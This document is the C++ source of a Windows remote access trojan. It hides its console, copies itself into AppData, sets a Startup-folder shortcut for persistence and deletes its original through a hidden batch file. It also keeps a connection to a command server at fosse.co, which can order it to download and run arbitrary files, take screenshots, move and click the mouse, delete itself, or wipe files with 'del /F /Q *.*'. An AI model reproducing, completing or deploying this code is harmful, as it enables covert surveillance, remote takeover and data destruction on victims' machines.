


#pragma warning(disable:4996)


#include <stdio.h>
#include <fstream>
#include <stdlib.h>
#include <iostream>

#include <mutex>

#include <filesystem>

#include <string>

#include <chrono>
#include <thread>

#include <vector>

#include <algorithm>
#include "screen.h"
#include "base64.h"
#include "MouseController.hpp"

#include <gdiplus.h>
#pragma comment(lib, "Gdiplus.lib")

//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")





namespace fs = std::experimental::filesystem;

#if defined(_WIN32)
	#include <Windows.h>
	#include <Lmcons.h>
	#include <shlobj.h>
#endif

#include <curl/curl.h>


#include "sio/sio_client.h"








//std::string rootPath("C:\Users\mattc\Desktop\folder");

//C:\\Users\\<UserName>\\AppData\\Roaming\\me
//C:\\Users\\<UserName>\\AppData\\Roaming\Microsoft\Windows\Start Menu\Programs

//boost::filesystem::path p(".");



//std::experimental::filesystem



//fs::create_directories("sandbox/a/b");
//std::ofstream("sandbox/file1.txt");
//fs::create_symlink("a", "sandbox/syma");

/*
#if defined(_WIN32)
	bool windows = true;
	bool linux = false;
	bool mac = false;
#elif defined(__linux__)
	bool linux = true;
	bool windows = false;
	bool mac = false;
#endif
*/




size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}




void download(char outfilename[FILENAME_MAX], char *url) {

	CURL *curl;
	FILE *fp;
	CURLcode res;

	curl = curl_easy_init();
	if (curl) {
		fp = fopen(outfilename, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
	}

}

std::string getExeFullPath() {	
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	return filename;
}

std::string getExeName() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	std::string str = filename;
	std::size_t found = str.find_last_of("/\\");
	return str.substr(found + 1);
}

std::string getExeDir() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);
	std::string str = filename;
	std::size_t found = str.find_last_of("/\\");
	return str.substr(0, found);
}




void execute(std::string fileToRun, char *dir = NULL) {


	std::vector<char> v3(fileToRun.length() + 1);
	std::strcpy(&v3[0], fileToRun.c_str());
	char *lpApplicationName = &v3[0];


	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/*
	std::vector<char> v1(desiredCurrentDirectory.length() + 1);
	std::strcpy(&v1[0], desiredCurrentDirectory.c_str());
	char* desiredCurrentDirChar = &v1[0];
	*/

	// start the program up
	CreateProcess(lpApplicationName,   // the path
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		dir,           // Use parent's starting directory by default(if null)
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure
		

	/*
	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	*/
}



bool selfDelete() {
	TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];

	if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) &&
		(GetShortPathName(szFile, szFile, MAX_PATH) != 0))
	{
		lstrcpy(szCmd, "/c del ");
		lstrcat(szCmd, szFile);
		lstrcat(szCmd, " >> NUL");

		if ((GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) &&
			((INT)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE)>32))
			return true;
	}

	return true;
}



void selfDelete2() {

	std::string filename = "bat.bat";
	// my app
	char myApp[MAX_PATH];
	GetModuleFileName(0, myApp, MAX_PATH);
	std::string::size_type pos = std::string(myApp).find_last_of("\\");
	std::string myAppFileName = std::string(myApp).substr(pos + 1, std::string(myApp).length());
	// bat
	char dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, dir);
	std::string finalDir = std::string(dir) + "\\bat.bat";

	std::ofstream file(filename, std::ios::out);
	if (file.is_open()) {
		file << ":Repeat" << std::endl;
		file << "del " + myAppFileName << std::endl;
		file << "if exist " + myAppFileName + " goto Repeat " << std::endl;
		file << "del ""%0"" ";
		file.close();
	}
	ShellExecute(NULL, "open", finalDir.c_str(), NULL, NULL, SW_HIDE);
}



void deleteDir() {
	std::string filename = "bat.bat";
	// my app
	char myApp[MAX_PATH];
	GetModuleFileName(0, myApp, MAX_PATH);
	std::string::size_type pos = std::string(myApp).find_last_of("\\");
	std::string myAppFileName = std::string(myApp).substr(pos + 1, std::string(myApp).length());
	// bat
	char dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, dir);
	std::string finalDir = std::string(dir) + "\\bat.bat";

	std::ofstream file(filename, std::ios::out);
	if (file.is_open()) {
		file << ":Repeat" << std::endl;
		file << "del /F /Q *.*" << std::endl;
		file << "del ""%0"" ";
		file.close();
	}
	ShellExecute(NULL, "open", finalDir.c_str(), NULL, NULL, SW_HIDE);
}


std::string getFileNameFromPath(std::string path) {
	int no_of_backslash = (int)count(path.begin(), path.end(), '\\');
	if (no_of_backslash == 0) {
		std::size_t found = path.find_last_of("/\\");
		return path.substr(found + 1);
	} else {
		std::size_t found = path.find_last_of("\\");
		return path.substr(found + 1);
	}
}




std::mutex _lock;




int main() {

	MouseController MC;

	// hide console window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	// Initialize GDI+.
	ULONG_PTR m_gdiplusToken;
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	Gdiplus::GdiplusStartup(&m_gdiplusToken, &gdiplusStartupInput, NULL);


	char user_name[UNLEN + 1];
	DWORD user_name_size = sizeof(user_name);
	GetUserName(user_name, &user_name_size);
	std::cout << "username: " << user_name << std::endl;

	std::string name(user_name);

	fs::path desiredCurrentPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Media\\";
	std::string desiredCurrentDirectory = desiredCurrentPath.string();

	std::vector<char> v3(desiredCurrentDirectory.length() + 1);
	std::strcpy(&v3[0], desiredCurrentDirectory.c_str());
	char * desiredCurrentDirectoryChar = &v3[0];
	

	fs::path startupPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
	std::string startupString = startupPath.string();
	

	fs::path lnkPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Startup.lnk";
	std::string lnkString = lnkPath.string();
	


	if (!fs::is_directory(desiredCurrentPath)) {
		std::cout << "desired directory doesn't exist." << std::endl;
		std::cout << desiredCurrentDirectory << std::endl;
		fs::create_directory(desiredCurrentPath);
	}


	fs::path currentExePath = getExeFullPath();
	fs::path newExePath = desiredCurrentDirectory + getExeName();

	std::string currentExeString = currentExePath.string();
	std::string newExeString = newExePath.string();

	std::cout << currentExeString << std::endl;
	std::cout << newExeString << std::endl;


	if (!(currentExeString.compare(newExeString) == 0)) {

		// does not fix
		/*if (fs::exists(newExePath)) {
			// fix incase of malformed startup link
			SetCurrentDirectory(desiredCurrentDirectoryChar);
		}*/

		//fs::copy_file(currentExePath, newExePath);
		std::string test = "copy \"" + currentExeString + "\" \"" + newExeString + "\"";
		system(test.c_str());
	}


	if (!fs::exists(lnkPath)) {
		std::cout << "link doens't exist, creating..." << std::endl;

		CoInitialize(NULL);
		IShellLink* pShellLink = NULL;
		HRESULT hres;
		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink);
		//std::cout << std::hex << hres << std::endl;
		//if (SUCCEEDED(hres)) {


		std::vector<char> v1(newExeString.length() + 1);
		std::strcpy(&v1[0], newExeString.c_str());
		char *newExeChar = &v1[0];

		std::vector<char> v2(lnkString.length() + 1);
		std::strcpy(&v2[0], lnkString.c_str());
		char *lnkChar = &v2[0];


		const size_t size = strlen(lnkChar) + 1;
		wchar_t* lnkWChar = new wchar_t[size];
		mbstowcs(lnkWChar, lnkChar, size);

		std::wcout << lnkWChar << std::endl;

		pShellLink->SetPath(newExeChar);  // Path to the object we are referring to
		pShellLink->SetWorkingDirectory(desiredCurrentDirectoryChar);
		pShellLink->SetDescription("Startup");
		pShellLink->SetIconLocation(newExeChar, 0);

		IPersistFile *pPersistFile;
		hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);

		hres = pPersistFile->Save(lnkWChar, TRUE);

		pPersistFile->Release();
		pShellLink->Release();

		delete[] lnkWChar;
	}

	


	if (!(currentExeString.compare(newExeString) == 0)) {
		execute(newExeString, desiredCurrentDirectoryChar);
		// self delete
		selfDelete2();
		exit(0);
	}

	// fix incase of malformed startup link
	SetCurrentDirectory(desiredCurrentDirectoryChar);


	sio::client myClient;
	// set infinite reconnect attempts
	myClient.set_reconnect_attempts(999999999999);

	//myClient.connect("http://fosse.co:443/socket.io");
	//myClient.connect("http://fosse.co:80/socket.io");
	myClient.connect("http://fosse.co:80/socket.io"); // what it was

	myClient.connect("https://fosse.co:80/socket.io"); // works
	//myClient.connect("https://fosse.co:80/8100/socket.io");
	//myClient.connect("http://fosse.co/8110");// works


	// emit text
	myClient.socket()->emit("registerName", name);

	myClient.socket()->on("registerNames", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		char user_name[UNLEN + 1];
		DWORD user_name_size = sizeof(user_name);
		GetUserName(user_name, &user_name_size);
		std::cout << "username: " << user_name << std::endl;

		std::string name2(user_name);

		myClient.socket()->emit("registerName", name2);
	}));


	// download:
	myClient.socket()->on("dl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		
		//if (data->get_flag() == sio::message::flag_object) {

			//_lock.lock();

			std::cout << "recieved an object." << std::endl;

			std::string url = data->get_map()["url"]->get_string();
			//std::string filename = data->get_map()["filename"]->get_string();
			std::string filename = getFileNameFromPath(url);

			
			// convert to char *'s
			std::vector<char> v1(url.length() + 1);
			std::strcpy(&v1[0], url.c_str());
			char* urlChar = &v1[0];

			std::vector<char> v2(filename.length() + 1);
			std::strcpy(&v2[0], filename.c_str());
			char* filenameChar = &v2[0];

			// always overwrite
			//if (!fs::exists("./"+filename)) {
				std::cout << "file doesn't exist." << std::endl;
				std::cout << "downloading..." << std::endl;
				download(filenameChar, urlChar);
			//} else {
				//std::cout << "file already exists." << std::endl;
			//}
	}));





	// execute:
	myClient.socket()->on("ex", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		std::cout << "recieved exec." << std::endl;

		//std::string url = data->get_map()["url"]->get_string();
		std::string filename = data->get_map()["filename"]->get_string();


		// convert to char *'s

		std::vector<char> v2(filename.length() + 1);
		std::strcpy(&v2[0], filename.c_str());
		char* filenameChar = &v2[0];


		if (fs::exists(filename)) {
			std::cout << "file exists." << std::endl;
			std::cout << "running..." << std::endl;
			execute(filenameChar);
		}

	}));

	// screenshot:
	myClient.socket()->on("ss", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		
		RECT      rc;
		GetClientRect(GetDesktopWindow(), &rc);

		//printf("location: %ld\n", rc.right);
		//long nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
		//long nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

		long width = rc.right;
		long height = rc.bottom;

		if (width == 1500) {
			width *= 2;
			height *= 2;
		}

		POINT a{ 0, 0 };
		POINT b{ width, height };

		std::string encoded_string = screenshotToBase64(a, b);

		myClient.socket()->emit("screenshot", encoded_string);
	}));


	// left click:
	myClient.socket()->on("lcl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		std::cout << "recieved left click." << std::endl;

		int x = data->get_map()["x"]->get_int();
		int y = data->get_map()["y"]->get_int();

		MC.moveAbs(x, y);
		MC.leftClick();
	}));

	// right click:
	myClient.socket()->on("rcl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		std::cout << "recieved right click." << std::endl;

		int x = data->get_map()["x"]->get_int();
		int y = data->get_map()["y"]->get_int();

		MC.moveAbs(x, y);
		MC.rightClick();
	}));

	myClient.socket()->on("mvm", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		std::cout << "recieved move mouse." << std::endl;

		int x = data->get_map()["x"]->get_int();
		int y = data->get_map()["y"]->get_int();

		printf("x: %d y: %d\n", x, y);

		MC.moveAbs(x, y);
	}));
	


	myClient.socket()->on("sd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		selfDelete2();
		exit(0);
	}));


	myClient.socket()->on("dd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		deleteDir();
	}));



	/*myClient.socket()->on("dl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		//string filename = 
	}));*/

	/*
	sio::socket::event_listener_aux([&](string const& name, message::ptr const& data, bool isAck, message::list &ack_resp)
	{
		_lock.lock();
		string user = data->get_map()["username"]->get_string();
		string message = data->get_map()["message"]->get_string();
		EM(user << ":" << message);
		_lock.unlock();
	}));*/

	//while (true) {

	//	// sleep for 10000ms
	//	std::this_thread::sleep_for(std::chrono::milliseconds(10000));





	//	bool exists = fs::exists("version.txt");
	//	download("version.txt", "http://fosse.co/dl/version.txt");


	//	std::ifstream infile("version.txt");

	//	std::string line;
	//	while (std::getline(infile, line))
	//	{
	//		std::cout << line << std::endl;
	//	}

	//	
	//	//download("version.txt", "http://fosse.co/dl/version.txt");



	//	#if defined(_WIN32)


	//		/* LOCAL */


	//		char user_name[UNLEN + 1];
	//		DWORD user_name_size = sizeof(user_name);
	//		GetUserName(user_name, &user_name_size);
	//		std::cout << "username: " << user_name << std::endl;



	//		//fs::path localRootPath = "C:\\Users\\mattc\\Desktop\\folder\\";
	//		//fs::path localHiddenPath = localRootPath.string() + ".hidden";

	//		//fs::path localShortcutPath = "C:\\Users\\mattc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
	//		//fs::path localShortcutPath = "C:\\Users\\";
	//		//localShortcutPath += user_name;
	//		//localShortcutPath += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

	//		/* REMOTE */
	//		/*
	//		// list drives
	//		DWORD dwSize = MAX_PATH;
	//		char szLogicalDrives[MAX_PATH] = { 0 };
	//		DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
	//		if (dwResult > 0 && dwResult <= MAX_PATH)
	//		{
	//			char* szSingleDrive = szLogicalDrives;
	//			while (*szSingleDrive)
	//			{
	//				printf("Drive: %s\n", szSingleDrive);

	//				// get the next drive
	//				szSingleDrive += strlen(szSingleDrive) + 1;
	//			}
	//		}*/

	//		// change to remote path
	//		fs::path remoteRootPath = "C:\\Users\\mattc\\Desktop\\folder\\";
	//		fs::path remoteHiddenPath = remoteRootPath.string() + ".hidden";



	//	#elif defined(__linux__)
	//		fs::path remoteRootPath = "path";
	//		fs::path remoteHiddenFolder = remoteRootPath.string() + ".hidden";
	//	#endif




	//	/*
	//	// check for remote hidden folder
	//	std::cout << "remote root path: " << remoteRootPath << std::endl;
	//	std::cout << "remote hidden directory path: " << remoteHiddenPath << std::endl;

	//	if (fs::is_directory(remoteHiddenPath)) {
	//		std::cout << "remote hidden directory exists." << std::endl;
	//	} else {
	//		std::cout << "remote hidden directory does not exist." << std::endl;
	//		std::cout << "creating hidden directory." << std::endl;
	//		fs::create_directory(remoteHiddenPath);
	//		#if defined(_WIN32)
	//		SetFileAttributes((const char *)remoteHiddenPath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
	//		#elif defined(__linux__)
	//		// already hidden due to directory name
	//		#endif
	//		//FILE_ATTRIBUTE_HIDDEN

	//	}

	//	// search through all files in remote root path
	//	for (auto& path : fs::recursive_directory_iterator(remoteRootPath)) {
	//		if (fs::is_directory(path)) {
	//			std::cout << "directory: ";
	//		} else {
	//			std::cout << "file: ";
	//		}
	//		std::cout << path << std::endl;
	//	}*/
	//}


	// Shut Down GDI+
	//Gdiplus::GdiplusShutdown(m_gdiplusToken);

	

	// why is this necessary??
	int x;
	std::cin >> x;

	return 0;
}